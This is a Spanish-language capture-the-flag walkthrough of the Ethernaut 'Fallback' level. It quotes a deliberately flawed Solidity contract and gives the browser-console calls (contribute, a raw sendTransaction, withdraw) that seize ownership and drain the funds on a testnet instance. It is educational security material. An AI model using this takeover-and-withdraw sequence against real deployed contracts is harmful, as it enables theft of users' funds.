# Fallback

<!-- > Estas son las instrucciones en las que se basan este vídeo:

<p align="center">
  <a href="https://www.youtube.com/watch?v=YU-iNyvj6mA">
    <img src="https://img.youtube.com/vi/YU-iNyvj6mA/hqdefault.jpg" alt="Link al video de Youtube">
  </a>
</p> -->

Los objetivos son convertirse en el **dueño** del contrato y **reducir su balance a cero**, es decir robar sus fondos. Para empezar, vamos a crear una nueva instancia de este contrato en la red de pruebas Sepolia.

Ahora vamos a analizar el código, y como el primer objetivo es convertirse en el dueño, observamos que se inicia una variable de tipo `address` con la dirección del dueño.

```solidity
address public owner;
```

Más abajo, en la función `receive`, se establece esta variable a la cuenta que envía los fondos con la condición de que tenga **contribuciones**.

```solidity
receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```

¿Qué contribuciones?

Si subimos un poco, veremos que hay una función que se llama `contribute()` que requiere que se mande menos de 0.001 ether y establece en la variable _contributions_ un número mayor a cero, que es lo que necesitamos.

```solidity
function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
```

Primero vamos a comprobar quien es el `owner` desde la consola de comandos del navegador:

```jsx
await contract.owner();
```

Después vamos a llamar a esta función para tener al menos una contribución y poder pasar la condición de la función `receive`.

```jsx
await contract.contribute({ value: toWei("0.0001", "ether") });
```

Ahora que tenemos una **contribución**, enviaremos una transacción a bajo nivel al contrato para convertirnos en el `owner`.

```jsx
await sendTransaction({
  to: "<lvl instance>",
  value: toWei("0.0001", "ether"),
  from: "<player>",
});
```

Esperamos a que se confirme la transacción en la Blockchain y comprobamos que somos el `owner` del contrato.

```jsx
await contract.owner();
```

Ahora que somos los `owner` del contrato, podemos llamar a la función withdraw para retirar los fondos a nuestra cuenta.

```jsx
await contract.withdraw();
```

Para terminar, entregamos la instancia del nivel firmando la transacción.
